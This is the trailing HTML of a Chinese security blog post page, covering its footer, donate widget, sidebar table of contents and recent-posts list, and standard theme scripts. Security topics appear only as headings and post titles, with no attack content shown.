+    <a href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/" target="_blank" title="一些奇怪的姿势和场景杂烩">https://godownio.github.io/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2026/05/01/rhino-fan-xu-lie-hua/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">Rhino 反序列化</div>
+      </div>
+      <!-- <div class="content">
+        Rhino 反序列化Rhino库是用来在Java中执行Js代码的一个库
+pom：
+12345&lt;dependency
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          慧眼识珠牢弟
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>Godown_blog</h2>
+        
+        
+          <p>something for nothing</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">Godown_blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/godownio"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1958304602"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A7%BF%E5%8A%BF"><span class="toc-text">漏洞姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#header%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">header头注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#header%E7%88%86%E7%A0%B4"><span class="toc-text">header爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-text">硬编码的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%AA%8C%E8%AF%81"><span class="toc-text">越权漏洞的验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E4%B8%8A%E5%9C%BA%E6%99%AF%E7%9A%84ssrf"><span class="toc-text">云上场景的ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mybatis-QueryWrapper-SQL%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98"><span class="toc-text">Mybatis QueryWrapper SQL注入问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hql%E6%B3%A8%E5%85%A5"><span class="toc-text">hql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E6%9E%B6%E6%9E%84"><span class="toc-text">鉴权架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#case"><span class="toc-text">case</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPA-HTML"><span class="toc-text">SPA HTML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AI%E9%AA%8C%E8%AF%81%E5%A6%82%E4%BD%95bypass%E5%AE%89%E5%85%A8%E5%9B%B4%E6%A0%8F%EF%BC%9F"><span class="toc-text">AI验证如何bypass安全围栏？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E5%BC%80%E4%B8%8E%E6%A0%87%E5%93%81-x2F-%E5%A3%B3%E5%AD%90%E4%BB%A3%E7%A0%81"><span class="toc-text">客开与标品&#x2F;壳子代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LongAction"><span class="toc-text">LongAction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-text">点击劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#k8s%E7%9A%84%E9%87%8D%E5%90%AF%E5%8A%9F%E8%83%BD"><span class="toc-text">k8s的重启功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B3%E5%8F%B0%E5%8C%96%E6%96%B9%E6%A1%88%E4%B8%8B%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95"><span class="toc-text">平台化方案下的安全测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#postMessage"><span class="toc-text">postMessage</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#origin%E4%B8%8Esite"><span class="toc-text">origin与site</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E6%9E%B6%E6%9E%84"><span class="toc-text">云架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E6%A1%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">存储桶漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D"><span class="toc-text">签名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9A%E6%9F%90%E4%B8%AA%E5%AD%98%E5%82%A8%E6%A1%B6%E6%98%AF%E6%9F%90%E4%B8%AA%E5%85%AC%E5%8F%B8%E7%9A%84%E8%B5%84%E4%BA%A7"><span class="toc-text">如何确定某个存储桶是某个公司的资产</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bucket-policy%E9%97%AE%E9%A2%98"><span class="toc-text">bucket policy问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%85%AC%E5%8F%B8%E6%9C%89%E8%B6%85%E7%BA%A7%E5%A4%9A%E7%9A%84%E6%A1%B6%EF%BC%8C%E6%80%8E%E4%B9%88%E6%8E%92%E6%9F%A5%E9%A3%8E%E9%99%A9"><span class="toc-text">发现公司有超级多的桶，怎么排查风险</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E7%9A%84%E5%A4%96%E5%B8%A6%E6%89%8B%E6%B3%95%EF%BC%8C%E5%A4%96%E5%B8%A6%E5%87%BD%E6%95%B0"><span class="toc-text">sql的外带手法，外带函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDEA-alt-F7%E6%90%9C%E4%B8%8D%E5%88%B0jar%E5%8C%85%E9%87%8C%E6%9F%90%E7%B1%BB%E5%9C%A8%E5%85%B6%E4%BB%96%E7%B1%BB%E7%9A%84%E7%94%A8%E6%B3%95%EF%BC%9F"><span class="toc-text">IDEA alt F7搜不到jar包里某类在其他类的用法？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AI%E4%B8%8D%E8%83%BD%E8%A7%A3%E5%86%B3%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="toc-text">AI不能解决的场景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#todo"><span class="toc-text">todo</span></a></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-18</span>
+                
+              </div>
+              <a class="post-title" href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/">一些奇怪的姿势和场景杂烩</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2026/05/01/rhino-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">05-01</span>
+                
+              </div>
+              <a class="post-title" href="/2026/05/01/rhino-fan-xu-lie-hua/">Rhino 反序列化</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2026/05/01/ghost-bits/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8195.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8195.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">05-01</span>
+                
+              </div>
+              <a class="post-title" href="/2026/05/01/ghost-bits/">Ghost Bits Bypass WAF</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2026/03/24/chun-qiu-yun-jing-vertex/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8194.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8194.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-24</span>
+                
+              </div>
+              <a class="post-title" href="/2026/03/24/chun-qiu-yun-jing-vertex/">春秋云镜 Vertex</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2026/03/19/alictf-2025-web-java/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8193.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8193.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-19</span>
+                
+              </div>
+              <a class="post-title" href="/2026/03/19/alictf-2025-web-java/">Alictf 2026 javaweb</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
